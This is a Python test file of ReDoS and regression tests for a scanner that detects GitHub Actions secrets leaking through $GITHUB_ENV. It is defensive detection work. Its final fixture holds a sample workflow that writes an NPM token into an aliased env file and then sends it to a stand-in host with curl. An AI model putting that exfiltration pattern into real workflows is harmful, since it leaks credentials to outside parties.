"""ReDoS regression tests — each case probes a regex pattern that
ALREADY caused catastrophic-backtracking pathology before being
fixed, OR is structurally adjacent to one that did.

Bounds asserted:
  * Per-input parse < 500ms (any pathological case should be < 200ms;
    500ms gives slack for CI variability)
  * Detection semantics unchanged on small adversarial inputs
"""

from __future__ import annotations

import time
from pathlib import Path

from packages.sca.supply_chain import gha_secret_flow


def _write_wf(tmp_path: Path, body: str) -> Path:
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    p = wf_dir / "wf.yml"
    p.write_text(body, encoding="utf-8")
    return p


_TIME_BUDGET_SECONDS = 0.5


# ---------------------------------------------------------------------------
# Heredoc — pre-fix this was O(n²) on unmatched openers
# ---------------------------------------------------------------------------

def test_redos_many_heredoc_openers_no_close(tmp_path: Path) -> None:
    """1000 ``cat <<TAG >> $GITHUB_ENV`` openers with no matching
    close.  Pre-fix took 5+ seconds (O(n²) walk per opener)."""
    body = "cat <<TAG >> $GITHUB_ENV\nx = y\n" * 1000
    t0 = time.monotonic()
    blocks = gha_secret_flow._extract_redirect_blocks(body, "GITHUB_ENV")
    elapsed = time.monotonic() - t0
    assert elapsed < _TIME_BUDGET_SECONDS, (
        f"1000 unmatched heredoc openers took {elapsed:.3f}s — "
        f"ReDoS regression"
    )
    assert blocks == []  # no closer found anywhere


def test_redos_many_heredocs_one_closer(tmp_path: Path) -> None:
    """500 ``cat <<TAG ... `` openers and one matching ``TAG\\n``
    closer at the end.  Pre-fix each opener walked the body."""
    body = "cat <<TAG >> $GITHUB_ENV\nx=y\n" * 500 + "TAG\n"
    t0 = time.monotonic()
    gha_secret_flow._extract_redirect_blocks(body, "GITHUB_ENV")
    elapsed = time.monotonic() - t0
    assert elapsed < _TIME_BUDGET_SECONDS


# ---------------------------------------------------------------------------
# Chained alias — pre-fix had a prefix-match bug AND quadratic blowup
# ---------------------------------------------------------------------------

def test_redos_chained_aliases_prefix_match_bounded() -> None:
    """1000 chained alias assignments.  Pre-fix:
      (a) returned 446 aliases (prefix-match bug: ``$A1`` matched
          ``$A10``/``$A11``/...)
      (b) took ~0.8s
    Post-fix: 6 aliases (chain depth cap correctly bounded) and
    < 200ms."""
    lines = ["A0=$GITHUB_ENV"]
    for i in range(1, 1000):
        lines.append(f"A{i}=$A{i-1}")
    body = "\n".join(lines)
    t0 = time.monotonic()
    aliases = gha_secret_flow._aliased_targets(body, "GITHUB_ENV")
    elapsed = time.monotonic() - t0
    assert elapsed < _TIME_BUDGET_SECONDS
    # Cap is 6 hops → 6 aliases (A0–A5) after excluding the target.
    assert len(aliases) == 6, (
        f"chain-depth cap broken; got {len(aliases)} aliases "
        f"(expected 6)"
    )
    assert set(aliases) == {"A0", "A1", "A2", "A3", "A4", "A5"}


def test_alias_prefix_no_false_match() -> None:
    """``A=$AB`` must NOT alias to ``$AB`` when scanning for target
    ``A`` — pre-fix the alias name regex matched prefixes."""
    body = "AB=$GITHUB_ENV\nC=$AB\n"
    aliases = gha_secret_flow._aliased_targets(body, "GITHUB_ENV")
    # Direct alias for $GITHUB_ENV is AB.  Then via AB: chain finds C.
    # Both AB and C should be present.  Critically NO other names.
    assert set(aliases) == {"AB", "C"}


# ---------------------------------------------------------------------------
# Eval — alternation branches don't overlap; verify no pathology
# ---------------------------------------------------------------------------

def test_redos_eval_unclosed_quote_long_body() -> None:
    """``eval "AAAA...`` (no closing quote, 100KB).  Confirms the
    alternation in ``((?:[^"\\\\]|\\\\.)*)`` doesn't backtrack
    catastrophically."""
    body = 'eval "' + ("a" * 100_000)
    t0 = time.monotonic()
    blocks = gha_secret_flow._extract_redirect_blocks(body, "GITHUB_ENV")
    elapsed = time.monotonic() - t0
    assert elapsed < _TIME_BUDGET_SECONDS
    assert blocks == []


def test_redos_eval_pathological_backslashes() -> None:
    """``eval "\\\\\\\\\\\\\\\\..."`` — many backslash pairs.
    Worst case for the ``\\\\.`` branch of the alternation."""
    body = 'eval "' + ("\\\\" * 25_000)
    t0 = time.monotonic()
    gha_secret_flow._extract_redirect_blocks(body, "GITHUB_ENV")
    elapsed = time.monotonic() - t0
    assert elapsed < _TIME_BUDGET_SECONDS


def test_redos_many_short_evals() -> None:
    """1000 short ``eval "..."`` invocations — bounded extraction +
    fast per-eval parsing."""
    body = 'eval "echo X=Y >> $GITHUB_ENV";' * 1000
    t0 = time.monotonic()
    blocks = gha_secret_flow._extract_redirect_blocks(body, "GITHUB_ENV")
    elapsed = time.monotonic() - t0
    assert elapsed < _TIME_BUDGET_SECONDS
    # Capped at _MAX_REDIRECT_BLOCKS_PER_BODY.
    assert len(blocks) == gha_secret_flow._MAX_REDIRECT_BLOCKS_PER_BODY


# ---------------------------------------------------------------------------
# Combined pathology
# ---------------------------------------------------------------------------

def test_redos_full_pipeline_pathological_workflow(tmp_path: Path) -> None:
    """End-to-end through scan_target with a workflow that combines
    multiple pathological shapes.  Must complete under budget."""
    body = """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
"""
    # 200 heredoc openers + a giant body + chained aliases
    inner: list = []
    for _ in range(200):
        inner.append("          cat <<EOFNNN >> $GITHUB_ENV")
        inner.append("          " + "a" * 200)
    inner.append("          A0=$GITHUB_ENV")
    for i in range(1, 500):
        inner.append(f"          A{i}=$A{i-1}")
    body += "\n".join(inner) + "\n"
    _write_wf(tmp_path, body)
    t0 = time.monotonic()
    hits = gha_secret_flow.scan_target(tmp_path, [], [])
    elapsed = time.monotonic() - t0
    assert elapsed < 1.0, (
        f"pathological workflow took {elapsed:.3f}s — bounds broken"
    )
    del hits


# ---------------------------------------------------------------------------
# Alias-set blowup — pre-fix ran one full-body regex scan PER alias
# per iteration (~50k scans for a body with ~50k alias assignments)
# ---------------------------------------------------------------------------

def test_alias_flood_completes_in_seconds(tmp_path: Path) -> None:
    """5,000 direct alias assignments in one run body.  Pre-fix,
    iteration 2 of ``_aliased_targets`` ran one full-body scan per
    alias found in iteration 1 — thousands of scans over a large
    body.  Post-fix: one combined-alternation scan per iteration
    (O(depth) full-body scans) with the alias set capped."""
    header = """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: |
"""
    lines = [f"          V{i}=$GITHUB_ENV" for i in range(5000)]
    lines.append(
        '          echo "K=${{ secrets.NPM_TOKEN }}" >> $V42')
    _write_wf(tmp_path, header + "\n".join(lines) + "\n")
    t0 = time.monotonic()
    hits = gha_secret_flow.scan_target(tmp_path, [], [])
    elapsed = time.monotonic() - t0
    assert elapsed < 5.0, (
        f"5,000-alias body took {elapsed:.3f}s — alias-set scan "
        f"blowup regression"
    )
    del hits


def test_alias_set_is_capped() -> None:
    body = "\n".join(f"V{i}=$GITHUB_ENV" for i in range(5000))
    aliases = gha_secret_flow._aliased_targets(body, "GITHUB_ENV")
    assert len(aliases) <= gha_secret_flow._MAX_ALIAS_SET_SIZE


def test_alias_chain_semantics_pinned_small_case() -> None:
    """Depth-6 chain semantics for small alias sets must be identical
    pre/post the combined-alternation rewrite — expected output pinned
    exactly."""
    body = (
        "A=$GITHUB_ENV\n"
        'B="$A"\n'
        "C=${B}\n"
        "T=GITHUB_ENV\n"          # indirection target (literal)
        "UNRELATED=$OTHER\n"
    )
    aliases = gha_secret_flow._aliased_targets(body, "GITHUB_ENV")
    assert sorted(aliases) == ["A", "B", "C", "T"]


def test_alias_redirect_small_case_results_pinned(tmp_path: Path) -> None:
    """End-to-end canonical case: taint laundered to $GITHUB_ENV via
    an alias, consumed by a later step with egress.  Results pinned so
    the alias-scan rewrite can't silently change detection output."""
    wf = """\
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - name: launder
        run: |
          T=$GITHUB_ENV
          echo "LEAK=${{ secrets.NPM_TOKEN }}" >> $T
      - name: use
        run: |
          curl https://evil.example/?x=$LEAK
"""
    _write_wf(tmp_path, wf)
    hits = gha_secret_flow.scan_target(tmp_path, [], [])
    assert [
        (h.job_id, h.step_index, h.sink_kind, h.secret_names, h.severity)
        for h in hits
    ] == [
        ("j", 0, "run_block", ("NPM_TOKEN",), "medium"),
        ("j", 1, "run_block", ("NPM_TOKEN",), "high"),
    ]
